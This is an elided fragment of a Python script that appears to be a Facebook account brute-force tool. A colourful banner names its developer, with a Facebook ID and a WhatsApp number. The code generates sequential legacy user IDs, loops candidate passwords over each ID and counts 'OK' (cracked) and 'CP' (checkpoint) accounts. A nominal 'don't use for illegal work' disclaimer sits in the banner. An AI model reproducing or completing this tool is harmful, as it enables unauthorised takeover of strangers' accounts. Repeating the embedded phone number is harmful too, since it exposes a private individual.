...
def notice():
	...
	runtxt(''\033[0;94mE74XOS4X28287GVYZI1EE1G2E28JYW2421QW'')
...
class Main:
	def __init__(self):
		...
		print ("""\033[0;92m_    _ _____ __  __ ______ _      ____ ___
\033[0;91m| |  | |_   _|  \/  |  ____| |    |___ \__ \               | |__| | | | | \  / | |__  | |      __) | ) |
\033[0;92m|  __  | | | | |\/| |  __| | |     |__ < / /               | |  | |_| |_| |  | | |____| |____ ___) / /_
\033[0;93m|_|  |_|_____|_|  |_|______|______|____/____|
 
 > \033[0;92mDEVELOPER      : HIMEL
 > \033[0;95mFACEBOOK ID  : mdnx.himel32
 > \033[0;41mWHATSAPP       : 01601161609
 > \033[0;96mCREATOR         : KINGHIMEL32
 > \033[0;97mWARNING        : DONT USE FOR ILLEGAL WORK     
	...
	def old_9(self):
		...
		xx = 999999
		idx = "100000000"
		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(1000000 MAX): \033[0;92m"))
		if (limit)>5000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [HAMII] : %s/%s -> \033[0;92m [ HIMEL-OK:%s ]- \033[0;93m[HIMEL-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
